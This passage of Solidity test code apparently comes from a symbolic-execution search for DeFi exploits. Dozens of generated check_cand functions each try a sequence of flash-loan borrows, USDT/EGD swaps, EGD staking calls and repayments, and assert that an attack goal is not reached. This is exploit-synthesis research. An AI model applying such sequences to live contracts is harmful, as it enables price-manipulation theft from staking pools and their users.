        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand370(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand371(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand372(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand373(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand374(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand375(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand376(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand377(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand378(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand379(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand380(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand381(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand382(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand383(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand384(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand385(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand386(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand387(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand388(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand389(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand390(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand391(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand392(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_egd(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand393(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand394(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand395(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand396(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand397(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand398(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand399(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand400(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand401(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand402(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand403(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand404(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand405(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand406(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand407(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand408(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_egd(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand409(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand410(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand411(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_egd(amt4);
        swap_pair_egd_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand412(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_usdt(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand413(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand414(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand415(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand416(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand417(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand418(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand419(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        swap_pair_usdt_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand420(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand421(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        swap_pair_usdt_egd(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand422(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        payback_owner_egd(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

